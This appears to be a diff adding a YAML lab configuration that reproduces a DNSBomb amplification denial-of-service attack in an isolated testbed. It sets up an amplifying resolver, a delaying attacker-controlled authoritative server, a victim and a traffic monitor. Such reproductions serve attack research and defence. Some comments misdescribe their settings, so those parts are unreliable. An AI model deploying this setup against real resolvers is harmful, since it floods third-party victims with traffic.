@@ -1,0 +1,140 @@
+name: dnsbomb
+inet: 10.50.0.0/24
+
+include: resource:/includes/std-auth.yml
+
+vars:
+  # Attack domain - controlled by the attacker
+  attack_domain: attack.com
+  # Trigger domain
+  trigger_domain: bomb.${vars.attack_domain}
+  # Timeout (ms) - simulating resolver timeout window
+  timeout: 9800
+  # Response size (bytes) - leveraging EDNS0 amplification
+  response_size: 4096
+
+images:
+  # Attacker client - sends forged queries
+  attacker:
+    ref: python:3.12.0
+    util:
+      - scapy
+
+  # BIND recursive resolver - acting as "amplifier"
+  resolver:
+    ref: unbound:1.22.0
+
+  # BIND authoritative server - for DNS hierarchy
+  auth:
+    ref: bind:9.18.4
+
+  # Victim server - receives attack traffic
+  victim:
+    ref: python:3.12.0
+    util:
+      - tshark
+      - pv
+
+builds:
+
+  # ==================== Recursive resolver (amplifier) ====================
+  resolver:
+    image: resolver
+    ref: std:recursor
+    behavior: . hint root
+    volumes:
+     - ${origin}./shared:/usr/local/etc
+    network_mode: host
+    address: ""
+    files:
+      /usr/local/etc/unbound/bomb.conf.server: |
+        port: 35353
+        edns-buffer-size: ${vars.response_size}
+        max-udp-size: ${vars.response_size}
+        # 1. Disable anti-jostle mechanism: allow requests to hang for a full 10 seconds, never proactively drop packets
+        jostle-timeout: 10000 
+        
+        # 2. Expand concurrent queue: raise single-thread max pending queries from default 1024 to the limit
+        num-queries-per-thread: 65536
+        
+        # 3. Disable Infra Cache penalty: even if the authoritative server is unresponsive, never mark it as DOWN
+        infra-cache-slabs: 1
+        
+        # 4. Increase authoritative retry tolerance
+        outbound-msg-retry: 5
+        
+        # 5. Ensure old cache does not interfere with new subdomain attacks
+        msg-cache-size: 0
+
+  # ==================== DNS hierarchy ====================
+  # Root server
+  root:
+    image: auth
+    ref: std:auth
+    behavior: . master com NS tld
+
+  # TLD server
+  tld:
+    image: auth
+    ref: std:auth
+    behavior: com master attack NS auth
+
+  # Attacker-controlled authoritative server
+  # Key: deliberately delay response, returning at the last moment before timeout
+  auth:
+    image: attacker
+    volumes:
+      - resource/dnsbomb-auth/dnsbomb-auth:/usr/local/bin/auth
+      - ${origin}./shared:/usr/local/etc
+    command: bash /usr/local/bin/auth.sh
+    files:
+      /usr/local/bin/auth.sh: 
+        chmod +x /usr/local/bin/auth
+        
+        /usr/local/bin/auth -listen :53 -domain ${vars.attack_domain} -timeout ${vars.timeout} -size 1100
+    environment:
+      DOMAIN: ${vars.attack_domain}
+      DELAY: ${vars.timeout}
+      IP: ${ip}
+
+  # ==================== Victim ====================
+  victim:
+    image: victim
+    command: tail -f /dev/null
+    environment:
+      # For monitoring received attack traffic
+      IP: ${ip}
+    cap_add:
+      - NET_ADMIN
+    command: tshark -i eth0 -n -z io,stat,0.05,"SUM(frame.len)frame.len" -f "udp port 35353"
+
+  # ==================== Optional: Test client ====================
+  monitor:
+    image: attacker
+    volumes:
+      - resource/dnsbomb-monitor/dnsbomb-monitor:/usr/local/bin/dm
+      - ${origin}./shared:/usr/local/etc
+    environment:
+      R: 10.50.0.1
+    network_mode: host
+    address: ""
+    command: bash /usr/local/bin/monitor.sh
+    files: 
+      /usr/local/bin/monitor.sh:
+        chmod +x /usr/local/bin/dm
+
+        /usr/local/bin/dm -subnet ${proj.inet} -attacker ${srv.victim.ip} -resolver 10.50.0.1 -victim ${srv.victim.ip} -interval 100 -log /usr/local/etc/traffic.log
+
+auto:
+  post: |
+    from pathlib import Path
+
+    # Set output directory permissions
+    for svc_name in ['resolver', 'auth', 'victim']:
+      target_path = Path(workdir / "output" / config["name"] / svc_name / "contents")
+      if target_path.exists():
+        target_path.chmod(0o777)
+        for item in target_path.rglob("*"):
+          if item.is_file() or item.is_dir():
+            item.chmod(0o777)
+
